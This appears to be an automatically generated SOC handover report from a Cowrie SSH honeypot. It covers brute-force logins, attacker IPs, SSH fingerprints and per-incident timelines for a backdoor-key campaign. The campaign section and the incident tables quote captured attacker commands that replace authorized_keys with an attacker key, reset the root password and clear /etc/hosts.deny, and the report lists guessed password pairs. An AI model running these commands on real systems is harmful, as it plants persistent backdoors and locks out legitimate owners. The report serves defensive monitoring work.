# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T08:59:03Z |
| **Shift Time** | 08:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **200** |
| Confirmed Threats | **181** |
| False Positives Filtered | **19** (9.5%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **7** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **136** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **138** |
| Unique Credential Pairs | **81** |
| Unique Usernames | **35** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `345gs5662d34` | 29 |
| `ubuntu` | 5 |
| `user` | 3 |
| `steam` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `2wsx#$` | 2 |
| `Qwer1234@` | 1 |
| `ftpuser001` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 29 |
| `root` | `2wsx#$` | 2 |
| `root` | `Qwer1234@` | 1 |
| `ftpuser001` | `ftpuser001` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwer1234@` | `41.242.115.83` | 2026-04-08T07:15:09 |
| `root` | `3245gs5662d34` | `41.242.115.83` | 2026-04-08T07:15:15 |
| `root` | `Qwertyuiop@#` | `41.242.115.83` | 2026-04-08T07:18:39 |
| `root` | `a123456n` | `45.78.194.186` | 2026-04-08T07:19:49 |
| `root` | `3245gs5662d34` | `45.78.194.186` | 2026-04-08T07:20:07 |
| `root` | `a1234567b` | `41.242.115.83` | 2026-04-08T07:20:33 |
| `root` | `zz123456.` | `14.103.37.34` | 2026-04-08T07:22:33 |
| `root` | `2wsx#$` | `45.78.194.186` | 2026-04-08T07:23:00 |
| `root` | `alaska` | `45.78.194.186` | 2026-04-08T07:36:08 |
| `root` | `123qwe,.` | `45.78.194.186` | 2026-04-08T07:42:25 |
| `root` | `DDdd111` | `45.78.194.186` | 2026-04-08T07:51:42 |
| `root` | `bitcoin123` | `45.78.194.186` | 2026-04-08T08:04:16 |
| `root` | `123ubuntu` | `45.78.194.186` | 2026-04-08T08:13:33 |
| `root` | `QweAsd1` | `120.230.181.229` | 2026-04-08T08:17:22 |
| `root` | `qazwsx54321#$` | `39.115.183.206` | 2026-04-08T08:19:03 |
| `root` | `3245gs5662d34` | `39.115.183.206` | 2026-04-08T08:19:07 |
| `root` | `QwertQwert123456` | `5.181.87.35` | 2026-04-08T08:20:11 |
| `root` | `3245gs5662d34` | `5.181.87.35` | 2026-04-08T08:20:17 |
| `root` | `Rc123456` | `186.219.184.142` | 2026-04-08T08:21:55 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-04-08T08:22:03 |
| `root` | `Test@123456` | `186.219.184.142` | 2026-04-08T08:25:44 |
| `root` | `bilal123` | `186.219.184.142` | 2026-04-08T08:29:16 |
| `root` | `Cacat123` | `5.181.87.35` | 2026-04-08T08:30:58 |
| `root` | `new1234` | `186.219.184.142` | 2026-04-08T08:31:08 |
| `root` | `aA123456!` | `115.190.13.99` | 2026-04-08T08:32:09 |
| `root` | `Abc!@#456` | `5.181.87.35` | 2026-04-08T08:34:33 |
| `root` | `ddAA123` | `186.219.184.142` | 2026-04-08T08:34:55 |
| `root` | `Root11111!!` | `5.181.87.35` | 2026-04-08T08:36:24 |
| `root` | `indonesia` | `5.181.87.35` | 2026-04-08T08:38:19 |
| `root` | `Asd123456!` | `115.190.13.99` | 2026-04-08T08:38:56 |
| `root` | `3245gs5662d34` | `115.190.13.99` | 2026-04-08T08:39:08 |
| `root` | `Qwerty112233` | `5.181.87.35` | 2026-04-08T08:40:06 |
| `root` | `root54321@#` | `5.181.87.35` | 2026-04-08T08:41:55 |
| `root` | `A123123Z` | `186.219.184.142` | 2026-04-08T08:42:25 |
| `root` | `qazwsx12345!` | `5.181.87.35` | 2026-04-08T08:45:43 |
| `root` | `ubuntu@123` | `5.181.87.35` | 2026-04-08T08:47:26 |
| `root` | `root.123` | `5.181.87.35` | 2026-04-08T08:49:15 |
| `root` | `qwerty654321` | `186.219.184.142` | 2026-04-08T08:51:49 |
| `root` | `123!@#Qwe` | `5.181.87.35` | 2026-04-08T08:53:00 |
| `root` | `master123` | `186.219.184.142` | 2026-04-08T08:53:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **200** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 178 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 176 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 176 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:h52z5iXvQghi"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.230.181.229`, `14.103.37.34`, `45.78.194.186`, `115.190.13.99`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `41.242.115.83`, `186.219.184.142`, `45.78.194.186`, `115.190.13.99`, `39.115.183.206`, `5.181.87.35`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **12** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS262970` | Tudo Internet | 1 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS37613` | DOLPHIN TELECOMMUNICATION LIMITED | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-89f29dfe4403

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:15 |
| **Last Seen** | 2026-04-08 07:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:15:08` | `cowrie.session.connect` |
| `2026-04-08 07:15:08` | `cowrie.client.version` |
| `2026-04-08 07:15:08` | `cowrie.client.kex` |
| `2026-04-08 07:15:09` | `cowrie.login.success` |
| `2026-04-08 07:15:09` | `cowrie.session.params` |
| `2026-04-08 07:15:09` | `cowrie.command.input` |
| `2026-04-08 07:15:09` | `cowrie.command.failed` |
| `2026-04-08 07:15:10` | `cowrie.log.closed` |
| `2026-04-08 07:15:10` | `cowrie.session.params` |
| `2026-04-08 07:15:10` | `cowrie.command.input` |
| `2026-04-08 07:15:10` | `cowrie.session.file_download` |
| `2026-04-08 07:15:10` | `cowrie.log.closed` |
| `2026-04-08 07:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d2067ead6d3

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:15 |
| **Last Seen** | 2026-04-08 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:15:13` | `cowrie.session.connect` |
| `2026-04-08 07:15:13` | `cowrie.client.version` |
| `2026-04-08 07:15:14` | `cowrie.client.kex` |
| `2026-04-08 07:15:15` | `cowrie.login.success` |
| `2026-04-08 07:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a17bb400649

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:18 |
| **Last Seen** | 2026-04-08 07:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:18:38` | `cowrie.session.connect` |
| `2026-04-08 07:18:38` | `cowrie.client.version` |
| `2026-04-08 07:18:38` | `cowrie.client.kex` |
| `2026-04-08 07:18:39` | `cowrie.login.success` |
| `2026-04-08 07:18:40` | `cowrie.session.params` |
| `2026-04-08 07:18:40` | `cowrie.command.input` |
| `2026-04-08 07:18:40` | `cowrie.command.failed` |
| `2026-04-08 07:18:40` | `cowrie.log.closed` |
| `2026-04-08 07:18:41` | `cowrie.session.params` |
| `2026-04-08 07:18:41` | `cowrie.command.input` |
| `2026-04-08 07:18:41` | `cowrie.session.file_download` |
| `2026-04-08 07:18:41` | `cowrie.log.closed` |
| `2026-04-08 07:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b5da344d1d

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:18 |
| **Last Seen** | 2026-04-08 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:18:44` | `cowrie.session.connect` |
| `2026-04-08 07:18:44` | `cowrie.client.version` |
| `2026-04-08 07:18:44` | `cowrie.client.kex` |
| `2026-04-08 07:18:45` | `cowrie.login.success` |
| `2026-04-08 07:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f8a94c5f9b

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:19 |
| **Last Seen** | 2026-04-08 07:20 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:19:47` | `cowrie.session.connect` |
| `2026-04-08 07:19:47` | `cowrie.client.version` |
| `2026-04-08 07:19:48` | `cowrie.client.kex` |
| `2026-04-08 07:19:49` | `cowrie.login.success` |
| `2026-04-08 07:20:07` | `cowrie.session.params` |
| `2026-04-08 07:20:07` | `cowrie.command.input` |
| `2026-04-08 07:20:07` | `cowrie.command.failed` |
| `2026-04-08 07:20:07` | `cowrie.log.closed` |
| `2026-04-08 07:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-923ecf4288d9

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:20 |
| **Last Seen** | 2026-04-08 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:20:06` | `cowrie.session.connect` |
| `2026-04-08 07:20:06` | `cowrie.client.version` |
| `2026-04-08 07:20:06` | `cowrie.client.kex` |
| `2026-04-08 07:20:07` | `cowrie.login.success` |
| `2026-04-08 07:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e5c6f9014d

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:20 |
| **Last Seen** | 2026-04-08 07:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:20:32` | `cowrie.session.connect` |
| `2026-04-08 07:20:32` | `cowrie.client.version` |
| `2026-04-08 07:20:32` | `cowrie.client.kex` |
| `2026-04-08 07:20:33` | `cowrie.login.success` |
| `2026-04-08 07:20:34` | `cowrie.session.params` |
| `2026-04-08 07:20:34` | `cowrie.command.input` |
| `2026-04-08 07:20:34` | `cowrie.command.failed` |
| `2026-04-08 07:20:34` | `cowrie.log.closed` |
| `2026-04-08 07:20:35` | `cowrie.session.params` |
| `2026-04-08 07:20:35` | `cowrie.command.input` |
| `2026-04-08 07:20:35` | `cowrie.session.file_download` |
| `2026-04-08 07:20:35` | `cowrie.log.closed` |
| `2026-04-08 07:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b32804ea125

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:20 |
| **Last Seen** | 2026-04-08 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:20:38` | `cowrie.session.connect` |
| `2026-04-08 07:20:38` | `cowrie.client.version` |
| `2026-04-08 07:20:38` | `cowrie.client.kex` |
| `2026-04-08 07:20:39` | `cowrie.login.success` |
| `2026-04-08 07:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aaf766eba1f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:22 |
| **Last Seen** | 2026-04-08 07:22 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:h52z5iXvQghi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:22:31` | `cowrie.session.connect` |
| `2026-04-08 07:22:31` | `cowrie.client.version` |
| `2026-04-08 07:22:32` | `cowrie.client.kex` |
| `2026-04-08 07:22:33` | `cowrie.login.success` |
| `2026-04-08 07:22:33` | `cowrie.session.params` |
| `2026-04-08 07:22:33` | `cowrie.command.input` |
| `2026-04-08 07:22:33` | `cowrie.command.failed` |
| `2026-04-08 07:22:34` | `cowrie.log.closed` |
| `2026-04-08 07:22:34` | `cowrie.session.params` |
| `2026-04-08 07:22:34` | `cowrie.command.input` |
| `2026-04-08 07:22:34` | `cowrie.session.file_download` |
| `2026-04-08 07:22:34` | `cowrie.log.closed` |
| `2026-04-08 07:22:46` | `cowrie.session.params` |
| `2026-04-08 07:22:46` | `cowrie.command.input` |
| `2026-04-08 07:22:46` | `cowrie.log.closed` |
| `2026-04-08 07:22:47` | `cowrie.session.params` |
| `2026-04-08 07:22:47` | `cowrie.command.input` |
| `2026-04-08 07:22:48` | `cowrie.log.closed` |
| `2026-04-08 07:22:48` | `cowrie.session.params` |
| `2026-04-08 07:22:48` | `cowrie.command.input` |
| `2026-04-08 07:22:48` | `cowrie.session.file_download` |
| `2026-04-08 07:22:48` | `cowrie.log.closed` |
| `2026-04-08 07:22:49` | `cowrie.session.params` |
| `2026-04-08 07:22:49` | `cowrie.command.input` |
| `2026-04-08 07:22:49` | `cowrie.log.closed` |
| `2026-04-08 07:22:50` | `cowrie.session.params` |
| `2026-04-08 07:22:50` | `cowrie.command.input` |
| `2026-04-08 07:22:50` | `cowrie.log.closed` |
| `2026-04-08 07:22:50` | `cowrie.session.params` |
| `2026-04-08 07:22:50` | `cowrie.command.input` |
| `2026-04-08 07:22:50` | `cowrie.command.input` |
| `2026-04-08 07:22:51` | `cowrie.log.closed` |
| `2026-04-08 07:22:52` | `cowrie.session.params` |
| `2026-04-08 07:22:52` | `cowrie.command.input` |
| `2026-04-08 07:22:52` | `cowrie.log.closed` |
| `2026-04-08 07:22:53` | `cowrie.session.params` |
| `2026-04-08 07:22:53` | `cowrie.command.input` |
| `2026-04-08 07:22:54` | `cowrie.log.closed` |
| `2026-04-08 07:22:54` | `cowrie.session.params` |
| `2026-04-08 07:22:54` | `cowrie.command.input` |
| `2026-04-08 07:22:54` | `cowrie.log.closed` |
| `2026-04-08 07:22:55` | `cowrie.session.params` |
| `2026-04-08 07:22:55` | `cowrie.command.input` |
| `2026-04-08 07:22:55` | `cowrie.log.closed` |
| `2026-04-08 07:22:56` | `cowrie.session.params` |
| `2026-04-08 07:22:56` | `cowrie.command.input` |
| `2026-04-08 07:22:56` | `cowrie.log.closed` |
| `2026-04-08 07:22:57` | `cowrie.session.params` |
| `2026-04-08 07:22:57` | `cowrie.command.input` |
| `2026-04-08 07:22:57` | `cowrie.log.closed` |
| `2026-04-08 07:22:58` | `cowrie.session.params` |
| `2026-04-08 07:22:58` | `cowrie.command.input` |
| `2026-04-08 07:22:58` | `cowrie.log.closed` |
| `2026-04-08 07:22:58` | `cowrie.session.params` |
| `2026-04-08 07:22:58` | `cowrie.command.input` |
| `2026-04-08 07:22:58` | `cowrie.log.closed` |
| `2026-04-08 07:22:59` | `cowrie.session.params` |
| `2026-04-08 07:22:59` | `cowrie.command.input` |
| `2026-04-08 07:22:59` | `cowrie.log.closed` |
| `2026-04-08 07:22:59` | `cowrie.session.params` |
| `2026-04-08 07:22:59` | `cowrie.command.input` |
| `2026-04-08 07:22:59` | `cowrie.log.closed` |
| `2026-04-08 07:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3fa8f1e875

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:22 |
| **Last Seen** | 2026-04-08 07:23 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Aqe90Obd7HWZ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
